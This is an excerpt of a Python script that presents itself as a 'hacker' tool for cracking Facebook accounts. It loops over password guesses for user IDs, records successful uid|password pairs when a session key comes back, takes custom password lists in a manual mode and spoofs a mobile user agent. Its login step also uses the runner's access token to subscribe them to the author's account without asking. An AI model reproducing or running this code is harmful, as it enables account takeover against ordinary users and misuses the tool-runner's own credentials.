...
ct = datetime.now()
n = ct.month
bulan = ["January", "February", "March", "April", "May", "June", "July", "Agustust", "September", "October", "November", "December"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
...
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Agustust", "09": "September", "10": "October", "11": "November", "12": "December"}
...
S:::::::::::::::SS I::::::::I A:::::A                 A:::::A L::::::::::::::::::::::LK:::::::K    K:::::K   OO:::::::::OO         T:::::::::T      I::::::::I     S:::::::::::::::SSA:::::A                 A:::::A F::::::::FF           E::::::::::::::::::::EE::::::::::::::::::::E
 SSSSSSSSSSSSSSS   IIIIIIIIIIAAAAAAA                   AAAAAAALLLLLLLLLLLLLLLLLLLLLLLLKKKKKKKKK    KKKKKKK     OOOOOOOOO           TTTTTTTTTTT      IIIIIIIIII      SSSSSSSSSSSSSSS AAAAAAA                   AAAAAAAFFFFFFFFFFF           EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
	...
	os.system("clear")
	print("""\x1b[0;32m╔════════════════════════════════════════════╗
\x1b[0;33m║WELCOME TO SIALKOTI UNDERGROUND TOOL [HACKER].  ║
\x1b[0;33m║       #TOOL AUTHOR [S•U•F•E•E] MAFIA SAFEE. ║
\x1b[0;33m╚════════════════════════════════════════════╝
\x1b[0;33m ---------------------------------------------
\x1b[0;33m╔════════════════════════════════════════════╗
\x1b[0;33m║#YOUTUBE : https://youtube.com/SocialTech.                                         ║
\x1b[0;33m║#FACEBOOK : https://www.facebook.com/rebel.badshah.397               ║
\x1b[0;33m║#GITHUB : https://github.com/safianbaig/SIALKOTI-SARKAR.git          ║
\x1b[0;33m║#WHATSAPP : +923118284471.                                                                 ║
\x1b[0;33m╚════════════════════════════════════════════╝""")
def login():
	os.system("clear")
	try:
	...
	try:
		...
		try:
			...
			#-> bot follow
			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # SaFian. baig
			menu()
		except KeyError:
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mSAFEE PRO/FASTER \033[1;97m]")
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;95m[SARKAR-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
...
def manual():
	try:
		...
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	print("\n[+] Type , For 2nd Password For Example : 112233,334455,445566,223344°786786etc")
